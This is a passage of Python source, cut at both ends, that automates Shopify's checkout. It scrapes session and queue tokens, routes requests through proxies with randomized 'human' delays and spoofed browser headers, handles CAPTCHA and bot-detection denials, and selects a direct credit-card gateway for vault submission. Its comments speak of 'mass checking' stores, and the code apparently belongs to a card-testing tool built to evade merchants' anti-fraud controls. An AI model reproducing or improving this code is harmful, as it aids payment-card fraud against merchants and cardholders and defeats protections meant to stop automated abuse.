                    sst = extract_between(text, 'name="serialized-sessionToken" content="', '"')
                if not sst:
                    sst = extract_between(text, '"serializedSessionToken":"', '"')
                if not sst:
                    sst = extract_between(text, 'data-session-token="', '"')
                if not sst:
                    sst = extract_between(text, '"sessionToken":"', '"')
                if sst:
                    _sst_methods_tried.append("html_meta/json")
                else:
                    _sst_methods_tried.append("html_meta/json:None")
            
            # Method 4: Script tag / window object patterns (newer Shopify SPA)
            # FIX: Modern Shopify embeds checkout data in script tags as JSON.
            # The session token may be in window.__SESSION_TOKEN__ or similar.
            if not sst:
                # Try window.__SST__ or window.sessionToken patterns
                _script_patterns = [
                    r'window\.__SESSION_TOKEN__\s*=\s*["\']([^"\']+)["\']',
                    r'window\.sessionToken\s*=\s*["\']([^"\']+)["\']',
                    r'Shopify\.checkout\s*=\s*\{[^}]*sessionToken["\']?\s*:\s*["\']([^"\']+)["\']',
                    r'"sessionToken"\s*:\s*"([a-zA-Z0-9_-]{20,})"',
                    r'session_token["\']?\s*[:=]\s*["\']([a-zA-Z0-9_-]{20,})["\']',
                ]
                for _pat in _script_patterns:
                    _m = re.search(_pat, text)
                    if _m:
                        sst = _m.group(1)
                        _sst_methods_tried.append(f"script_pattern:{_pat[:30]}")
                        break
                if not sst:
                    _sst_methods_tried.append("script_patterns:None")
            
            # Method 5: Broad regex fallback — find any token-like string near session token context
            # FIX: As a last resort, search for the X-Checkout-One-Session-Token value
            # that may be embedded in the page JS as a string literal or variable.
            if not sst:
                # Look for the header value pattern in JS code
                _broad_match = re.search(r'["\']([a-f0-9]{32,64})["\']\s*(?:,\s*["\']x-checkout|;.*session)', text)
                if not _broad_match:
                    # Try finding a hex string near "session" context
                    _broad_match = re.search(r'session[_ ]?token[^=]*[=:]\s*["\']([a-f0-9]{32,64})["\']', text, re.IGNORECASE)
                if _broad_match:
                    sst = _broad_match.group(1)
                    _sst_methods_tried.append("broad_regex")
                else:
                    _sst_methods_tried.append("broad_regex:None")
            
            # Method 6: Check response.headers for alternative header names
            # FIX: Shopify may use different header names in some regions/versions
            if not sst:
                for _hdr_key in response.headers:
                    _hdr_lower = _hdr_key.lower()
                    if 'session' in _hdr_lower and 'token' in _hdr_lower and 'checkout' in _hdr_lower:
                        sst = response.headers[_hdr_key]
                        _sst_methods_tried.append(f"alt_header:{_hdr_key}")
                        break
                if not sst:
                    _sst_methods_tried.append("alt_headers:None")
            
            # FIX: Check login redirect BEFORE session token extraction.
            # If Shopify redirected to a login page, there's no point extracting tokens.
            # Also improved the check — only match if 'login' appears as a distinct path
            # segment (e.g., /account/login or /login) to avoid false positives from
            # checkout tokens that happen to contain "login" as a substring.
            _checkout_path = urlparse(checkout_url).path.lower()
            if _checkout_path.endswith('/login') or '/account/login' in _checkout_path or '/login?' in _checkout_path:
                return False, "Site requires login!", gateway, total_price, currency

            queueToken = extract_between(text, 'queueToken&quot;:&quot;', '&quot;') or extract_between(text, '"queueToken":"', '"')
            # FIX: Additional queueToken extraction patterns for newer Shopify
            if not queueToken:
                _qt_match = re.search(r'"queueToken"\s*:\s*"([^"]+)"', text)
                if _qt_match:
                    queueToken = _qt_match.group(1)

            stableId = extract_between(text, 'stableId&quot;:&quot;', '&quot;') or extract_between(text, '"stableId":"', '"')
            # FIX: Additional stableId extraction patterns
            if not stableId:
                _sid_match = re.search(r'"stableId"\s*:\s*"([^"]+)"', text)
                if _sid_match:
                    stableId = _sid_match.group(1)

            
            merch = extract_between(text, 'ProductVariantMerchandise/', '&quot;') or \
                    extract_between(text, 'ProductVariantMerchandise/', '&q') or \
                    extract_between(text, '"merchandiseId":"gid://shopify/ProductVariantMerchandise/', '"')
            if not merch:
                merch = str(variant_id)
            
            currency = 'USD'
            if 'currencyCode&quot;:&quot;' in text:
                currency = extract_between(text, 'currencyCode&quot;:&quot;', '&quot;') or 'USD'
            elif '"currencyCode":"' in text:
                currency = extract_between(text, '"currencyCode":"', '"') or 'USD'
            # FIX: Additional currency extraction from JSON data
            if currency == 'USD':
                _curr_match = re.search(r'"currencyCode"\s*:\s*"([A-Z]{3})"', text)
                if _curr_match:
                    currency = _curr_match.group(1)

            
            subtotal = extract_between(text, 'subtotalBeforeTaxesAndShipping&quot;:{&quot;value&quot;:{&quot;amount&quot;:&quot;', '&quot;') or \
                     extract_between(text, '"subtotalBeforeTaxesAndShipping":{"value":{"amount":"', '"')
            if not subtotal:
                price_match = re.search(r'"price":\s*"([\d.]+)"', text)
                subtotal = price_match.group(1) if price_match else "0.01"

            unescaped_text = text.replace('&quot;', '"').replace('&amp;', '&').replace('&#39;', "'")
            
            build_id = None
            build_match = re.search(r'"commitSha"\s*:\s*"([a-f0-9]{40})"', unescaped_text)
            if build_match:
                build_id = build_match.group(1)
            
            source_token = extract_between(text, 'name="serialized-sourceToken" content="', '"')
            if source_token:
                source_token = source_token.replace('&quot;', '').strip('"')
            
            ident_sig = None
            ident_match = re.search(r'checkoutCardsinkCallerIdentificationSignature":"([^"]+)"', unescaped_text)
            if ident_match:
                ident_sig = ident_match.group(1)

            # FIX: Extract PCI vault build hash dynamically from checkout page.
            # Shopify rotates /build/<hash>/ regularly — using a hardcoded hash causes
            # the vault to reject the request with HTML instead of JSON.
            # Pattern: looks for cardsink/number JS bundle URL or direct build hash in page.
            pci_build_hash = "a8e4a94"  # fallback (old known hash)
            pci_hash_match = re.search(
                r'checkout\.pci\.shopifyinc\.com/build/([a-f0-9]+)/', text
            )
            if not pci_hash_match:
                pci_hash_match = re.search(
                    r'checkout\.pci\.shopifyinc\.com/build/([a-f0-9]+)/', unescaped_text
                )
            if pci_hash_match:
                pci_build_hash = pci_hash_match.group(1)

            if not sst:
                # RETRY: Re-fetch the checkout page with GET (some stores reject POST)
                # and re-attempt all extraction methods before giving up.
                print(f"[SESSION_TOKEN] First attempt failed, retrying checkout with GET...", file=sys.stderr)
                _retry_sst = None
                try:
                    _retry_headers = {
                        **headers,
                        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                        'Referer': ourl,
                        'sec-fetch-dest': 'document',
                        'sec-fetch-mode': 'navigate',
                        'sec-fetch-site': 'same-origin',
                        'sec-fetch-user': '?1',
                        'Upgrade-Insecure-Requests': '1',
                    }
                    await asyncio.sleep(random.uniform(1.0, 2.0))
                    _retry_resp = await session.get(
                        url=checkout, allow_redirects=True,
                        headers=_retry_headers, proxy=proxy, timeout=15
                    )
                    _retry_text = _retry_resp.text
                    _retry_url = str(_retry_resp.url)
                    _sst_methods_tried.append(f"retry_GET:status={_retry_resp.status_code}")

                    # Re-attempt header extraction
                    _retry_sst = (_retry_resp.headers.get('X-Checkout-One-Session-Token') or
                                  _retry_resp.headers.get('x-checkout-one-session-token'))
                    if _retry_sst:
                        _sst_methods_tried.append("retry_headers:found")

                    # Re-attempt JWT from redirect chain
                    if not _retry_sst and _retry_resp.history:
                        for _rr_url in [str(r.url) for r in _retry_resp.history]:
                            for _param_name in ['shop_pay_token', 'token', 'checkout_token', 'session_token', 'sst']:
                                _rr_match = re.search(rf'[?&]{_param_name}=([^&]+)', _rr_url)
                                if _rr_match:
                                    _rr_jwt = _rr_match.group(1)
                                    _rr_parts = _rr_jwt.split('.')
                                    if len(_rr_parts) >= 2:
                                        _rr_payload = _rr_parts[1] + '=' * ((4 - len(_rr_parts[1]) % 4) % 4)
                                        try:
                                            _rr_decoded = json.loads(base64.urlsafe_b64decode(_rr_payload))
                                            _retry_sst = (_rr_decoded.get('session_token') or
                                                          _rr_decoded.get('checkout_session_token') or
                                                          _rr_decoded.get('sst') or
                                                          _rr_decoded.get('token'))
                                            if _retry_sst:
                                                _sst_methods_tried.append(f"retry_jwt:{_rr_url[:40]}")
                                                break
                                        except Exception:
                                            pass
                                    # Also try as plain param value
                                    if not _retry_sst and _param_name in ('session_token', 'sst'):
                                        _retry_sst = _rr_match.group(1)
                                        _sst_methods_tried.append(f"retry_url_param:{_param_name}")
                                        break
                            if _retry_sst:
                                break

                    # Re-attempt HTML/JSON/script patterns on retry response
                    if not _retry_sst:
                        for _pattern_name, _start, _end in [
                            ('meta1', 'name="serialized-sessionToken" content="&quot;', '&quot;'),
                            ('meta2', 'name="serialized-sessionToken" content="', '"'),
                            ('json1', '"serializedSessionToken":"', '"'),
                            ('data1', 'data-session-token="', '"'),
                            ('json2', '"sessionToken":"', '"'),
                        ]:
                            _retry_sst = extract_between(_retry_text, _start, _end)
                            if _retry_sst:
                                _sst_methods_tried.append(f"retry_{_pattern_name}")
                                break

                    # Re-attempt script/regex patterns
                    if not _retry_sst:
                        for _pat in [
                            r'window\.__SESSION_TOKEN__\s*=\s*["\']([^"\']+)["\']',
                            r'"sessionToken"\s*:\s*"([a-zA-Z0-9_-]{20,})"',
                            r'session[_ ]?token[^=]*[=:]\s*["\']([a-f0-9]{32,64})["\']',
                        ]:
                            _rr_m = re.search(_pat, _retry_text, re.IGNORECASE)
                            if _rr_m:
                                _retry_sst = _rr_m.group(1)
                                _sst_methods_tried.append("retry_regex")
                                break

                    # Re-attempt alternative header names
                    if not _retry_sst:
                        for _hdr_key in _retry_resp.headers:
                            _hdr_lower = _hdr_key.lower()
                            if 'session' in _hdr_lower and 'token' in _hdr_lower and 'checkout' in _hdr_lower:
                                _retry_sst = _retry_resp.headers[_hdr_key]
                                _sst_methods_tried.append(f"retry_alt_header:{_hdr_key}")
                                break

                    if _retry_sst:
                        sst = _retry_sst
                        checkout_url = _retry_url
                        text = _retry_text
                        # Re-extract page-level variables from retry response
                        _retry_unescaped = text.replace('&quot;', '"').replace('&amp;', '&').replace('&#39;', "'")
                        _retry_build = re.search(r'"commitSha"\s*:\s*"([a-f0-9]{40})"', _retry_unescaped)
                        if _retry_build:
                            build_id = _retry_build.group(1)
                        _retry_pci = re.search(r'checkout\.pci\.shopifyinc\.com/build/([a-f0-9]+)/', text)
                        if not _retry_pci:
                            _retry_pci = re.search(r'checkout\.pci\.shopifyinc\.com/build/([a-f0-9]+)/', _retry_unescaped)
                        if _retry_pci:
                            pci_build_hash = _retry_pci.group(1)
                        _retry_src = extract_between(text, 'name="serialized-sourceToken" content="', '"')
                        if _retry_src:
                            source_token = _retry_src.replace('&quot;', '').strip('"')
                        _retry_ident = re.search(r'checkoutCardsinkCallerIdentificationSignature":"([^"]+)"', _retry_unescaped)
                        if _retry_ident:
                            ident_sig = _retry_ident.group(1)
                        # Re-extract queueToken and stableId
                        _retry_qt = extract_between(text, 'queueToken&quot;:&quot;', '&quot;') or extract_between(text, '"queueToken":"', '"')
                        if not _retry_qt:
                            _rqt_m = re.search(r'"queueToken"\s*:\s*"([^"]+)"', text)
                            if _rqt_m:
                                _retry_qt = _rqt_m.group(1)
                        if _retry_qt:
                            queueToken = _retry_qt
                        _retry_sid = extract_between(text, 'stableId&quot;:&quot;', '&quot;') or extract_between(text, '"stableId":"', '"')
                        if not _retry_sid:
                            _rsid_m = re.search(r'"stableId"\s*:\s*"([^"]+)"', text)
                            if _rsid_m:
                                _retry_sid = _rsid_m.group(1)
                        if _retry_sid:
                            stableId = _retry_sid
                        # FIX Bug #30: Re-extract attempt_token and checkout_uses_cn from the new checkout_url
                        attempt_token_match = re.search(r'/checkouts/cn/([^/?]+)', checkout_url)
                        checkout_uses_cn = bool(attempt_token_match)
                        if attempt_token_match:
                            attempt_token = attempt_token_match.group(1)
                        else:
                            plain_match = re.search(r'/checkouts/([^/?]+)', checkout_url)
                            attempt_token = plain_match.group(1) if plain_match else checkout_url.split('/')[-1].split('?')[0]
                        print(f"[SESSION_TOKEN] Retry succeeded: {sst[:8]}...", file=sys.stderr)
                except Exception as _retry_err:
                    _sst_methods_tried.append(f"retry_error:{str(_retry_err)[:40]}")
                    print(f"[SESSION_TOKEN] Retry failed: {_retry_err}", file=sys.stderr)

            if not sst:
                _diag = f"methods_tried=[{', '.join(_sst_methods_tried)}] url={checkout_url[:80]} status={response.status_code}"
                print(f"[SESSION_TOKEN] FAILED (after retry): {_diag}", file=sys.stderr)
                _snippet = text[:300].replace('\n', ' ').strip() if text else "EMPTY"
                print(f"[SESSION_TOKEN] Response snippet: {_snippet[:200]}", file=sys.stderr)
                return False, f"Failed to get session token ({_diag})", gateway, total_price, currency
            
            # FIX: Validate session token format — Shopify tokens are hex strings (32-64 chars).
            # If we extracted something that doesn't look like a token, it will cause
            # "Session is null" or "Negotiate returned null" errors downstream.
            # Log a warning if format seems off but proceed (better to try than fail).
            if not re.match(r'^[a-f0-9]{16,64}$', sst):
                print(f"[SESSION_TOKEN] WARNING: Token format unusual: len={len(sst)} starts={sst[:8]}... chars={set(sst[:20])}", file=sys.stderr)
            
            headers.update({
                'shopify-checkout-client': 'checkout-web/1.0',
                'shopify-checkout-source': f'id="{attempt_token}", type="{"cn" if checkout_uses_cn else "checkout-one"}"',
                'x-checkout-one-session-token': sst,
                'Referer': _referrer_for('graphql', ourl=ourl, checkout_url=checkout_url),  # Technique #6
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
            })
            if build_id:
                headers['x-checkout-web-build-id'] = build_id
                headers['x-checkout-web-deploy-stage'] = 'production'
                headers['x-checkout-web-server-handling'] = 'fast'
                headers['x-checkout-web-server-rendering'] = 'yes'
            if source_token:
                headers['x-checkout-web-source-id'] = source_token

            params = {'operationName': 'Proposal'}
            
            json_data = {
                'query': QUERY_PROPOSAL_SHIPPING,
                'variables': {
                    'sessionInput': {'sessionToken': sst},
                    'queueToken': queueToken or '',
                    'discounts': {'lines': [], 'acceptUnexpectedDiscounts': True},
                    'delivery': {
                        'deliveryLines': [{
                            'destination': {
                                'streetAddress': {
                                    'address1': street, 'address2': address2, 'city': city,
                                    'countryCode': country_code, 'postalCode': s_zip,
                                    'company': '', 'firstName': firstName, 'lastName': lastName,
                                    'zoneCode': state, 'phone': phone, 'oneTimeUse': False
                                }
                            },
                            'selectedDeliveryStrategy': {
                                'deliveryStrategyMatchingConditions': {
                                    'estimatedTimeInTransit': {'any': True},
                                    'shipments': {'any': True}
                                },
                                'options': {'phone': phone}
                            },
                            'targetMerchandiseLines': {'any': True},
                            'deliveryMethodTypes': ['SHIPPING'],
                            'expectedTotalPrice': {'any': True},
                            'destinationChanged': True
                        }],
                        'noDeliveryRequired': [],
                        'useProgressiveRates': False,
                        'prefetchShippingRatesStrategy': None,
                        'supportsSplitShipping': True
                    },
                    'deliveryExpectations': {'deliveryExpectationLines': []},
                    'merchandise': {
                        'merchandiseLines': [{
                            'stableId': stableId or '1',
                            'merchandise': {
                                'productVariantReference': {
                                    'id': f'gid://shopify/ProductVariantMerchandise/{merch}',
                                    'variantId': f'gid://shopify/ProductVariant/{variant_id}',
                                    'properties': [],
                                    'sellingPlanId': None,
                                    'sellingPlanDigest': None
                                }
                            },
                            'quantity': {'items': {'value': 1}},
                            'expectedTotalPrice': {'value': {'amount': subtotal, 'currencyCode': currency}},
                            'lineComponentsSource': None,
                            'lineComponents': []
                        }]
                    },
                    'memberships': {'memberships': []},
                    'payment': {
                        'totalAmount': {'any': True},
                        'paymentLines': [],
                        'billingAddress': {
                            'streetAddress': {
                                'address1': '', 'address2': '', 'city': '', 'countryCode': country_code,
                                'postalCode': '', 'company': '', 'firstName': '', 'lastName': '', 'zoneCode': state, 'phone': ''
                            }
                        }
                    },
                    'buyerIdentity': {
                        'buyerIdentity': {'presentmentCurrency': currency, 'countryCode': country_code},
                        'contactInfoV2': {'emailOrSms': {'value': email, 'emailOrSmsChanged': False}},
                        'marketingConsent': [
                            {'sms': {'consentState': 'DECLINED', 'value': phone, 'countryCode': country_code}},
                            {'email': {'consentState': 'GRANTED', 'value': email}}
                        ],
                        'shopPayOptInPhone': {'number': phone, 'countryCode': country_code},
                        'phoneCountryCode': country_code,
                        'rememberMe': False,
                        'setShippingAddressAsDefault': False
                    },
                    'tip': {'tipLines': []},
                    'taxes': {
                        'proposedAllocations': None,
                        'proposedTotalAmount': {'value': {'amount': '0', 'currencyCode': currency}},
                        'proposedTotalIncludedAmount': None,
                        'proposedMixedStateTotalAmount': None,
                        'proposedExemptions': []
                    },
                    'note': {
                        'message': None,
                        'customAttributes': [
                            {'key': 'gorgias.guest_id', 'value': ''},
                            {'key': 'gorgias.session_id', 'value': ''}
                        ]
                    },
                    'localizationExtension': {'fields': []},
                    'shopPayArtifact': {
                        'optIn': {
                            'vaultEmail': '',
                            'vaultPhone': phone,
                            'optInSource': 'REMEMBER_ME'
                        }
                    },
                    'nonNegotiableTerms': None,
                    'scriptFingerprint': {
                        'signature': None,
                        'signatureUuid': None,
                        'lineItemScriptChanges': [],
                        'paymentScriptChanges': [],
                        'shippingScriptChanges': []
                    },
                    'optionalDuties': {'buyerRefusesDuties': False},
                    'captcha': None,
                    'cartMetafields': []
                },
                'operationName': 'Proposal'
            }

            # Use the /unstable/ path — works across all Shopify checkout formats.
            # Token-specific paths (/checkouts/cn/{token}/graphql) return 404 on most stores.
            graphql_url = f'https://{urlparse(ourl).netloc}/checkouts/unstable/graphql'
            
            # RATE-LIMIT FIX: Extra delay before first GraphQL request to avoid hitting
            # rate limits right after checkout step. Mass checking causes rapid sequential
            # GraphQL hits on the same store, so a longer delay here helps significantly.
            await human_delay(min_sec=1.5, max_sec=3.0, step_name="pre_graphql")
            
            # FIX: Send Proposal query once (was sending TWICE with 3s sleep between,
            # using only the 2nd response — wasteful and can cause stale sessions).
            # Send once, if Throttled, then retry after delay.
            # FIX: Pass proxy=proxy so GraphQL requests go through the user's proxy
            # instead of Railway's IP (was the root cause of PROPOSAL_BLOCKED 429 errors).
            response, resp_text, _graphql_ok = await make_graphql_request_with_captcha_handling(
                session, graphql_url, params, headers, json_data, checkout_url, max_retries=1, proxy=proxy
            )
            
            # RATE-LIMIT FIX: If Throttled, retry with exponential backoff (3s→6s→9s) + jitter
            # Old code: single retry with fixed 3s delay — insufficient for mass checking
            _throttle_retries = 3
            for _t_attempt in range(_throttle_retries):
                if not response or '"Throttled"' not in resp_text:
                    break
                _t_backoff = 3.0 * (_t_attempt + 1)  # 3s, 6s, 9s
                _t_jitter = random.uniform(0.8, 1.2)  # ±20% jitter
                _t_delay = _t_backoff * _t_jitter
                print(f"[rate-limit] Proposal GraphQL Throttled, retry {_t_attempt+1}/{_throttle_retries} in {_t_delay:.1f}s", file=sys.stderr)
                await asyncio.sleep(_t_delay)
                # Sync sst from previous response headers into json_data body before retry
                if response:
                    _new_sst_prop = response.headers.get('x-checkout-one-session-token') or response.headers.get('X-Checkout-One-Session-Token')
                    if _new_sst_prop and _new_sst_prop != sst:
                        sst = _new_sst_prop
                        json_data['variables']['sessionInput']['sessionToken'] = sst
                response, resp_text, _graphql_ok = await make_graphql_request_with_captcha_handling(
                    session, graphql_url, params, headers, json_data, checkout_url, max_retries=1, proxy=proxy
                )
            
            # FIX (BUG I): Refresh sst from response headers after each GraphQL request.
            # make_graphql_request_with_captcha_handling updates the session token in
            # the headers dict (headers["x-checkout-one-session-token"]) but NOT in
            # the sst variable. The submit and poll mutations use sst directly in
            # their JSON body, so they'd send the OLD token while headers have the NEW one.
            # This mismatch causes "Session is null" and "Negotiate returned null" errors!
            if response:
                _new_sst = response.headers.get('x-checkout-one-session-token') or response.headers.get('X-Checkout-One-Session-Token')
                if _new_sst and _new_sst != sst:
                    print(f"[SESSION_TOKEN] Refreshed sst from proposal response headers: {sst[:8]}... -> {_new_sst[:8]}...", file=sys.stderr)
                    sst = _new_sst
                    # FIX Bug #29: Keep json_data body in sync with the refreshed sst.
                    # Without this, the delivery proposal sends the old sst in the body
                    # while headers have the new one, causing "Session is null" errors.
                    json_data['variables']['sessionInput']['sessionToken'] = sst
            
            if not response:
                return False, f"Request failed: {resp_text}", gateway, total_price, currency
            
            if is_captcha_required(resp_text):
                return False, "CAPTCHA_REQUIRED", gateway, total_price, currency
            
            try:
                resp_json = json.loads(resp_text)
            except json.JSONDecodeError as e:
                # FIX: Provide step-specific diagnostic error.
                # Previously this just said "Invalid JSON (HTTP X): preview"
                # which was then mangled by extract_clean_response() into
                # something like "Invalid JSON response: Expecting value: line 1 col"
                preview = resp_text[:200].replace('\n', ' ').strip()
                status_code = response.status_code if response else 'N/A'
                ct = response.headers.get('Content-Type', '') if response else ''
                is_html = '<html' in preview.lower() or '<!doctype' in preview.lower()
                if is_html:
                    title_match = re.search(r'<title>([^<]+)</title>', preview, re.IGNORECASE)
                    title = title_match.group(1).strip() if title_match else "HTML page"
                    return False, f"PROPOSAL_BLOCKED: HTML instead of JSON - {title} (HTTP {status_code})", gateway, total_price, currency
                elif not preview:
                    return False, f"PROPOSAL_EMPTY: Empty response (HTTP {status_code})", gateway, total_price, currency
                else:
                    return False, f"PROPOSAL_JSON_ERROR: {str(e)} (HTTP {status_code}, CT={ct})", gateway, total_price, currency

            if 'errors' in resp_json:
                errors = resp_json.get('errors', [])
                error_msgs = [e.get('message', str(e)) for e in errors[:3]]
                return False, f"GraphQL Error: {'; '.join(error_msgs)}", gateway, total_price, currency

            try:
                if 'data' not in resp_json:
                    return False, "No data in proposal response", gateway, total_price, currency
                
                session_data = resp_json['data'].get('session')
                if session_data is None:
                    return False, f"Session is null (sst={sst[:8]}... if empty=sess token expired)", gateway, total_price, currency
                
                negotiate = session_data.get('negotiate')
                if negotiate is None:
                    return False, f"Negotiate returned null (sst={sst[:8]}... may be expired)", gateway, total_price, currency
                
                result = negotiate.get('result')
                if result is None:
                    return False, "Result is null", gateway, total_price, currency
                
                result_type = result.get('__typename', 'Unknown')
                
                if result_type == 'CheckpointDenied':
                    # BUG #18 FIX: Extract redirect URL for diagnostics.
                    # CheckpointDenied means Shopify's bot detection flagged this request.
                    # The redirectUrl points to the CAPTCHA challenge page.
                    redirect_url = result.get('redirectUrl', '')
                    # Save any checkpointData from the response for potential retry
                    cd = result.get('checkpointData')
                    if cd:
                        checkpoint_data = cd
                    if redirect_url:
                        return False, f"CAPTCHA_BLOCK: CheckpointDenied -> {redirect_url[:80]}", gateway, total_price, currency
                    return False, "CAPTCHA_BLOCK: CheckpointDenied (no redirect URL)", gateway, total_price, currency
                
                if result_type == 'Throttled':
                    return False, "Throttled", gateway, total_price, currency
                
                if result_type == 'NegotiationResultFailed':
                    # errors are at the negotiate level, NOT inside result.
                    # NegotiationResultFailed only has __typename in its fragment;
                    # the actual error details live at negotiate.errors[].
                    _neg_errors = negotiate.get('errors', [])
                    if _neg_errors:
                        _neg_err_msgs = []
                        for _ne in _neg_errors[:3]:
                            _ne_code = _ne.get('code', '') or ''
                            _ne_msg = _ne.get('localizedMessage', '') or _ne.get('nonLocalizedMessage', '') or _ne.get('message', '') or ''
                            if _ne_msg:
                                _neg_err_msgs.append(f"{_ne_code}: {_ne_msg}" if _ne_code else _ne_msg)
                            elif _ne_code:
                                _neg_err_msgs.append(_ne_code)
                        _neg_detail = '; '.join(_neg_err_msgs) if _neg_err_msgs else 'Unknown reason'
                    else:
                        _neg_detail = 'No error details provided'
                    return False, f"Negotiation failed: {_neg_detail}", gateway, total_price, currency
                
                if result_type != 'NegotiationResultAvailable':
                    return False, f"Unexpected proposal result: {result_type}", gateway, total_price, currency
                
                checkpoint_data = result.get('checkpointData')
                
                # FIX (BUG H): Update queueToken from proposal response.
                # Shopify returns a FRESH queueToken in every NegotiationResultAvailable.
                # The old queueToken from the HTML page may be stale by the time we reach
                # the submit mutation. Using the stale token causes submit to fail.
                _new_queue_token = result.get('queueToken')
                if _new_queue_token:
                    if _new_queue_token != queueToken:
                        print(f"[QUEUE_TOKEN] Updated from proposal: {str(queueToken)[:8]}... -> {str(_new_queue_token)[:8]}...", file=sys.stderr)
                    queueToken = _new_queue_token
                
                seller_proposal = result.get('sellerProposal')
                if seller_proposal is None:
                    return False, "Seller proposal is null", gateway, total_price, currency
                
                delivery_data = seller_proposal.get('delivery')
                running_total_data = seller_proposal.get('runningTotal')
                
                if not running_total_data:
                    return False, "No runningTotal in sellerProposal", gateway, total_price, currency
                
                running_total = running_total_data['value']['amount']
                
                # ── Fix: Update subtotal from proposal response ──
                # Modern Shopify checkout HTML is a React skeleton with NO embedded
                # price data, so the HTML-extracted subtotal falls back to "0.01".
                # This causes "Your order total has changed" at submit because the
                # expectedTotalPrice doesn't match the real price.
                # The GraphQL proposal response contains the correct amounts.
                _subtotal_from_proposal = None
                
                # Try subtotalBeforeTaxesAndShipping from sellerProposal
                _sub_data = seller_proposal.get('subtotalBeforeTaxesAndShipping')
                if _sub_data and _sub_data.get('value'):
                    _subtotal_from_proposal = _sub_data['value'].get('amount')
                
                # Fallback: try merchandise line totalAmount
                if not _subtotal_from_proposal:
                    _merch = seller_proposal.get('merchandise')
                    if _merch and _merch.get('merchandiseLines'):
                        _lines = _merch['merchandiseLines']
                        if _lines and len(_lines) > 0:
                            _line_total = _lines[0].get('totalAmount')
                            if _line_total and _line_total.get('value'):
                                _subtotal_from_proposal = _line_total['value'].get('amount')
                
                # Fallback: try buyerProposal.subtotalBeforeTaxesAndShipping
                if not _subtotal_from_proposal:
                    _buyer_proposal = result.get('buyerProposal')
                    if _buyer_proposal:
                        _bsub = _buyer_proposal.get('subtotalBeforeTaxesAndShipping')
                        if _bsub and _bsub.get('value'):
                            _subtotal_from_proposal = _bsub['value'].get('amount')
                
                # Fallback: try runningTotal as last resort (includes shipping/tax)
                if not _subtotal_from_proposal:
                    _subtotal_from_proposal = running_total
                
                if _subtotal_from_proposal:
                    subtotal = str(_subtotal_from_proposal)
                    print(f"[PRICE-FIX] Updated subtotal from proposal: {subtotal} (was HTML-extracted)", file=sys.stderr)
                
            except (KeyError, TypeError) as e:
                return False, f"Failed to parse proposal response: {str(e)}", gateway, total_price, currency

            if not delivery_data:
                return False, "No delivery data in proposal", gateway, total_price, currency
            
            delivery_type = delivery_data.get('__typename', '')
            
            if delivery_type == 'PendingTerms':
                delivery_strategy = ''
                shipping_amount = 0.0
            elif delivery_type == 'FilledDeliveryTerms':
                delivery_lines = delivery_data.get('deliveryLines', [{}])
                if delivery_lines and len(delivery_lines) > 0:
                    available_strategies = delivery_lines[0].get('availableDeliveryStrategies', [])
                    if available_strategies and len(available_strategies) > 0:
                        delivery_strategy = available_strategies[0].get('handle', '')
                        shipping_amount_data = available_strategies[0].get('amount', {}).get('value', {}).get('amount', '0')
                        try:
                            shipping_amount = float(shipping_amount_data)
                        except (ValueError, TypeError):
                            shipping_amount = 0.0
                    else:
                        delivery_strategy = ''
                        shipping_amount = 0.0
                else:
                    delivery_strategy = ''
                    shipping_amount = 0.0
            else:
                delivery_strategy = ''
                shipping_amount = 0.0
            
            try:
                tax_data = seller_proposal.get('tax', {})
                if tax_data and tax_data.get('__typename') == 'FilledTaxTerms':
                    tax_amount_data = tax_data.get('totalTaxAmount', {}).get('value', {}).get('amount', '0')
                    tax_amount = float(tax_amount_data)
                else:
                    tax_amount = 0.0
            except (ValueError, TypeError):
                tax_amount = 0.0

            payment_data = seller_proposal.get('payment', {})
            payment_methods = []
            if payment_data and payment_data.get('__typename') == 'FilledPaymentTerms':
                payment_methods = payment_data.get('availablePaymentLines', [])
                # FIX: Select credit-card-capable payment method, not just the first one.
                # Shopify returns multiple payment methods (Shop Pay, Apple Pay, Google Pay,
                # PayPal, credit card). Using a wallet's paymentMethodIdentifier with
                # credit card session data from PCI vault causes "Missing credit card session
                # information" because the identifier doesn't match a direct card payment type.
                #
                # Priority 1: PaymentProvider with checkoutHostedFields (accepts direct CC input)
                # Priority 2: Any PaymentProvider (credit card gateway, no hosted fields yet)
                # Priority 3: First available method with identifier (last resort fallback)
                _cc_method_with_fields = None
                _cc_method_any = None
                _first_method_any = None
                
                # Wallet types that do NOT support direct credit card entry
                _WALLET_TYPENAMES = {
                    'ShopPayWalletConfig', 'ApplePayWalletConfig', 'GooglePayWalletConfig',
                    'PaypalWalletConfig', 'ShopifyInstallmentsWalletConfig',
                    'FacebookPayWalletConfig', 'AmazonPayClassicWalletConfig',
                    'WalletsPlatformConfiguration',
                }
                # Offsite types that redirect to external payment pages
                _OFFSITE_TYPENAMES = {'OffsiteProvider'}
                
                for method in payment_methods:
                    payment_method = method.get('paymentMethod', {})
                    typename = payment_method.get('__typename', '')
                    _pm_identifier = payment_method.get('paymentMethodIdentifier')
                    
                    if not _pm_identifier and not payment_method.get('name'):
                        continue
                    
                    # FIX (BUG L): Track first NON-wallet, NON-offsite method as fallback.
                    # Previously _first_method_any captured the first method regardless of type,
                    # which could be a wallet (e.g. ShopPay) that's incompatible with PCI vault
                    # CC tokenization, causing "Missing credit card session information".
                    if _first_method_any is None and typename not in _WALLET_TYPENAMES and typename not in _OFFSITE_TYPENAMES:
                        _first_method_any = payment_method
                    
                    # Skip wallet types — they can't process direct credit card input
                    if typename in _WALLET_TYPENAMES:
                        continue
                    
                    # Skip offsite providers — they redirect externally (PayPal, etc.)
                    if typename in _OFFSITE_TYPENAMES:
                        continue
                    
                    # PaymentProvider = direct credit card payment gateway
                    if typename == 'PaymentProvider':
                        hosted_fields = payment_method.get('checkoutHostedFields')
                        # Priority 1: Has hosted fields = accepts direct CC input via iframe
                        if hosted_fields is not None and hosted_fields != '':
                            if _cc_method_with_fields is None:
                                _cc_method_with_fields = payment_method
                        # Priority 2: Any PaymentProvider (may have hosted fields not yet loaded)
                        if _cc_method_any is None:
                            _cc_method_any = payment_method
                    
                    # CustomOnsiteProvider could also accept credit cards
                    elif typename == 'CustomOnsiteProvider':
                        if _cc_method_any is None:
                            _cc_method_any = payment_method
                
                # Select best available method
                selected_method = _cc_method_with_fields or _cc_method_any or _first_method_any
                
                if selected_method:
                    payment_identifier = selected_method.get('paymentMethodIdentifier')
                    displayName = selected_method.get('extensibilityDisplayName') or selected_method.get('name', 'Unknown')
